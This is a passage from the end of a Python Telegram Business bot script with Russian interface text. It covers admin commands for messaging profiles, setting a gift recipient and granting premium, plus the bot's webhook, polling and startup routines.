                return await send(chat,
                    f"❌ @{esc(uname)} не принимает сообщения от незнакомцев "
                    f"или не писал владельцу.", raw=True)
            return await send(chat, f"⚠️ {esc(desc)}", raw=True)

        if state.startswith("await_write:"):
            target = int(state.split(":")[1])
            p = await get_profile(target)
            await send(target, text, bcid=p[1])
            return await send(chat, f"✅ Отправлено → <code>{target}</code>", raw=True)

        if state == "await_recipient":
            if text == "-":
                settings["gift_recipient"] = None
                save_admin()
                return await send(chat, "✅ Получатель снят.", admin_panel_kb(), raw=True)
            uname = text.lstrip("@").strip()
            if not re.fullmatch(r"[A-Za-z0-9_]{4,32}", uname):
                return await send(chat, "⚠️ Некорректный юзернейм.", raw=True)
            settings["gift_recipient"] = {"username": uname, "id": None}
            save_admin()
            return await send(chat, f"✅ Получатель: @{esc(uname)}", admin_panel_kb(), raw=True)

        if state == "await_premium":
            if text.startswith("-"):
                try:
                    pid = int(text[1:])
                except ValueError:
                    return await send(chat, "⚠️ Нужен числовой ID.", raw=True)
                premium_ids.discard(pid)
                save_admin()
                return await send(chat, f"✅ Премиум снят с {pid}.", admin_panel_kb(), raw=True)
            try:
                pid = int(text)
            except ValueError:
                return await send(chat, "⚠️ Нужен числовой ID.", raw=True)
            premium_ids.add(pid)
            save_admin()
            return await send(chat, f"✅ Премиум выдан {pid}.", admin_panel_kb(), raw=True)

    cmd = text.split()[0].split("@")[0].lower() if text else ""

    if is_adm and cmd in ("/start", "/admin", "/panel"):
        return await send(chat, admin_panel_text(), admin_panel_kb(), raw=True)

    if is_adm and cmd == "/profiles":
        rows = await list_profiles()
        return await send(chat, f"👥 <b>Профили</b> ({len(rows)})\nВыбери:",
                          profiles_kb(rows), raw=True)

    if cmd in ("/start", "/help"):
        copy_btn = {"text": "📋 Скопировать юзернейм",
                    "copy_text": {"text": f"@{bot_name}"}}
        if BUTTON_STYLE:
            copy_btn["style"] = BUTTON_STYLE
        kb = {"inline_keyboard": [[copy_btn]]}
        return await send(chat, "👋 Привет! Подключи меня в Business → Автоматизация чатов.", kb)

# ============ ROUTER ============
async def handle(update):
    try:
        if "business_connection" in update:
            await on_connection(update["business_connection"])
        elif "business_message" in update:
            await on_business_message(update["business_message"])
        elif "callback_query" in update:
            await on_callback(update["callback_query"])
        elif "message" in update:
            await on_message(update["message"])
    except Exception:
        log.exception("апдейт %s", update.get("update_id"))

async def webhook(req):
    token = req.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if not hmac.compare_digest(token.encode(), SECRET.encode()):
        return web.Response(status=403)
    try:
        update = await req.json()
    except ValueError:
        return web.Response(status=400)
    background(handle(update))
    return web.Response(text="ok")

async def health(req):
    return web.Response(text="ok")

async def keepalive():
    while True:
        await asyncio.sleep(600)
        try:
            async with http.get(f"{PUBLIC_URL}/health") as resp:
                await resp.read()
        except Exception as e:
            log.warning("keepalive: %s", e)

async def poll_updates():
    await api("deleteWebhook")
    offset = 0
    while True:
        try:
            data = await api("getUpdates", offset=offset, timeout=30, allowed_updates=UPDATES)
            for update in data.get("result", []):
                offset = update["update_id"] + 1
                background(handle(update))
            if not data.get("ok"):
                await asyncio.sleep(3)
        except Exception as e:
            log.warning("getUpdates: %s", e)
            await asyncio.sleep(3)

async def main():
    global http, bot_name
    http = ClientSession(timeout=ClientTimeout(total=70))
    await init_db()
    load()
    me = (await api("getMe")).get("result") or {}
    if not me:
        raise SystemExit("BOT_TOKEN не подходит")
    bot_name = me["username"]
    log.info("юзернейм бота: @%s", bot_name)
    log.info("ADMIN_ID: %s", ADMIN_ID)
    await api("setMyCommands", commands=[
        {"command": "start", "description": "Меню"},
        {"command": "admin", "description": "Админ-панель"},
        {"command": "profiles", "description": "Список профилей"},
    ])
    background(sweeper())
    if PUBLIC_URL:
        app = web.Application()
        app.router.add_get("/health", health)
        app.router.add_post("/webhook", webhook)
        runner = web.AppRunner(app)
        await runner.setup()
        await web.TCPSite(runner, "0.0.0.0", PORT).start()
        log.info("webhook: %s/webhook  порт %s", PUBLIC_URL, PORT)
        await api("setWebhook", url=f"{PUBLIC_URL}/webhook", secret_token=SECRET,
                  allowed_updates=UPDATES, drop_pending_updates=True)
        background(keepalive())
    else:
        background(poll_updates())
    log.info("mega pult @%s запущен", bot_name)
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
